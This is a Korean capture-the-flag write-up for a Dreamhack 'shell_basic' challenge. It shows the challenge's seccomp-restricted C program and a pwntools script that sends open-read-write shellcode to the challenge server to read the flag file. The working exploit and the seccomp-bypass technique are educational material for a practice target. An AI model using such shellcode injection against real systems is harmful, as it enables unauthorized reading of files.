# [Shell_basic](https://dreamhack.io/wargame/challenges/410/) 

 문제 파일의 코드는 다음과 같다. 

```C
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

## Exploit strategy

처음 문제를 보았을 때는 mmap이라는 생소한 함수가 있어서 굉장히 당황스러웠다.

공부를 해서 찾아보니 문제에 적힌 코드 
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);의 의미는 offset(마지막 argument 0)에서 시작해서 0x1000바이트만큼을 start주소(첫번째 argument NULL)로 맵핑한다는 의미다. PROT인자는 메모리 보호모드의 종류이다. 여기서 fd값은 -1이다. fd 값을 -1로 하여 mmap함수를 사용하는 것은 메모리를 할당하는 기술 중의 하나라고 한다. 

유심히 봐야할 코드는 다음과 같다.
```
read(0, shellcode, 0x1000);
sc = (void *)shellcode; 
```
표준 입력을 통해 shellcode에 데이터를 저장한 후 함수포인터(sc)에 type casting을 하여 대입한다. 이렇게되면 함수포인터에는 shellcode의 시작주소가 담기게 된다.  이 문제의 목표는 제시한 플래그 파일을 읽어서 플래그를 획득(출력)하는 것이므로 orw shellcode를 실행해야한다. 따라서 shellcode에 orw shellcode를 담게 된다면 sc를 호출하는 순간 shellcode에 담긴 orw shellcode를 실행시킬 수 있을 것이다. 

## Exploit script 
```python
# importing pwntools
from pwn import* 

# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 매개변수는 각각 호스트와 포트넘버이다.
p = remote('host1.dreamhack.games',10732) 

#공격 대상 아키텍쳐는 x86-64
context.arch = 'amd64' 

#flag 위치와 이름
path = "/home/shell_basic/flag_name_is_loooooong"

#셸코드 선언
code = ''

#shellcraft를 이용하여 open system call의 셸코드를 사용.
code += shellcraft.open(path,0 ,0)

#shellcraft를 이용하여 read system call의 셸코드를 사용. 매개변수는 fd,buffer,count 순이다. 
#fd의 값으로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다.
#주의해야할 점은 buffer 값으로 (rsp-count)가 아니라 rsp 값을 야한다.
code += shellcraft.read('rax','rsp',0x1000)

#shellcraft를 이용하여 write system call의 셸코드를 사용. 매개변수는 fd,buffer,count 순이다. 
#fd 값으로 1(표준 출력), 나머지 인수는 read와 같음.
code += shellcraft.write(1,'rsp',0x1000)

#출력데이터 받아서 출력.
print(p.recv())

#작성한 셸코드를 기계어로 변환 후 전송
p.send(asm(code))

#플래그 형식은 DH{...}이므로 출력데이터를 '}'가 출력될 때까지 받아서 출력. 
print(p.recvuntil('}'))
```
